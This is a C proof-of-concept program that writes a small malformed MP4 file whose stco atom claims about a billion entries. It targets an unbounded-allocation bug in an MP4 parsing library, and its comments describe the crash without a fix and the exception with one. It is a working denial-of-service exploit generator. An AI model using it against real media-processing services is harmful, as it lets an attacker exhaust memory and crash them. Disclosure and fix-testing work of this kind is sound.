/*
 * POC: Unbounded table allocation from file-controlled entryCount (Vuln #4)
 *
 * Vulnerability: In mp4property.cpp, MP4TableProperty::Read() calls
 * GetCount() which returns the entryCount field read directly from file
 * metadata. This value is used to allocate arrays without validating against
 * the remaining atom size. An attacker can set entryCount to a huge value
 * (e.g., 0x3FFFFFFF) causing a multi-gigabyte allocation from a tiny file.
 *
 * This POC creates a minimal MP4 with the path:
 *   ftyp -> moov -> trak -> mdia -> minf -> stbl -> stco
 *
 * The stco atom claims entryCount = 0x3FFFFFFF (1,073,741,823) entries,
 * each 4 bytes = ~4GB allocation, but the atom only contains 4 bytes of
 * actual entry data.
 *
 * Usage:
 *   ./poc_table_alloc [output_filename]
 *
 * Then trigger with:
 *   MP4Read(<output_filename>)
 *
 * Expected result (without fix): OOM crash or massive allocation (~4GB)
 * Expected result (with fix): clean exception "entry count exceeds remaining atom size"
 */

#include <cstdio>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>  // htonl

static void write_u32(FILE* f, uint32_t v) {
    v = htonl(v);
    fwrite(&v, 4, 1, f);
}

static void write_fourcc(FILE* f, const char* cc) {
    fwrite(cc, 4, 1, f);
}

static void write_atom_header(FILE* f, uint32_t size, const char* type) {
    write_u32(f, size);
    write_fourcc(f, type);
}

int main(int argc, char** argv)
{
    const char* filename = "poc_table_alloc.mp4";
    if (argc > 1) {
        filename = argv[1];
    }

    FILE* f = fopen(filename, "wb");
    if (!f) {
        fprintf(stderr, "Failed to open %s for writing\n", filename);
        return 1;
    }

    /*
     * File structure:
     *   ftyp (20 bytes)
     *   moov -> trak -> mdia -> minf -> stbl -> stco (malformed)
     *
     * The stco atom structure:
     *   [8 bytes header: size + "stco"]
     *   [4 bytes: version=0 + flags=0]
     *   [4 bytes: entryCount = 0x3FFFFFFF]  <-- MALFORMED
     *   [4 bytes: one fake entry]            <-- only 1 entry of data
     *
     * Total stco size = 8 + 4 + 4 + 4 = 20 bytes
     * But claims 0x3FFFFFFF entries * 4 bytes each = ~4GB needed
     */

    /* Sizes (computed bottom-up) */
    const uint32_t stco_size = 20;          /* 8 hdr + 4 ver/flags + 4 count + 4 one entry */
    const uint32_t stbl_size = 8 + stco_size;
    const uint32_t minf_size = 8 + stbl_size;
    const uint32_t mdia_size = 8 + minf_size;
    const uint32_t trak_size = 8 + mdia_size;
    const uint32_t moov_size = 8 + trak_size;
    const uint32_t ftyp_size = 20;

    /* ftyp atom */
    write_atom_header(f, ftyp_size, "ftyp");
    write_fourcc(f, "isom");  /* major brand */
    write_u32(f, 0x200);     /* minor version */
    write_fourcc(f, "isom");  /* compatible brand */

    /* moov (container) */
    write_atom_header(f, moov_size, "moov");

    /* trak (container) */
    write_atom_header(f, trak_size, "trak");

    /* mdia (container) */
    write_atom_header(f, mdia_size, "mdia");

    /* minf (container) */
    write_atom_header(f, minf_size, "minf");

    /* stbl (container) */
    write_atom_header(f, stbl_size, "stbl");

    /* stco atom (THE MALFORMED ATOM) */
    write_atom_header(f, stco_size, "stco");
    write_u32(f, 0);            /* version=0, flags=0 */
    write_u32(f, 0x3FFFFFFF);  /* entryCount = 1,073,741,823 (MALICIOUS!) */
    write_u32(f, 0x00000000);  /* one fake chunk offset entry */

    fclose(f);

    uint32_t total = ftyp_size + moov_size;
    printf("POC file written: %s (%u bytes)\n", filename, total);
    printf("\nFile structure:\n");
    printf("  ftyp [%u bytes]\n", ftyp_size);
    printf("  moov [%u bytes]\n", moov_size);
    printf("    trak [%u bytes]\n", trak_size);
    printf("      mdia [%u bytes]\n", mdia_size);
    printf("        minf [%u bytes]\n", minf_size);
    printf("          stbl [%u bytes]\n", stbl_size);
    printf("            stco [%u bytes] <-- entryCount=0x3FFFFFFF\n", stco_size);
    printf("\nVulnerability: stco claims %u entries * 4 bytes = ~4GB allocation\n", 0x3FFFFFFF);
    printf("  but atom only has 4 bytes of entry data remaining.\n");
    printf("\nTo trigger: call MP4Read(\"%s\")\n", filename);
    printf("Without fix: OOM crash (~4GB allocation attempt)\n");
    printf("With fix: throws exception \"entry count exceeds remaining atom size\"\n");

    return 0;
}
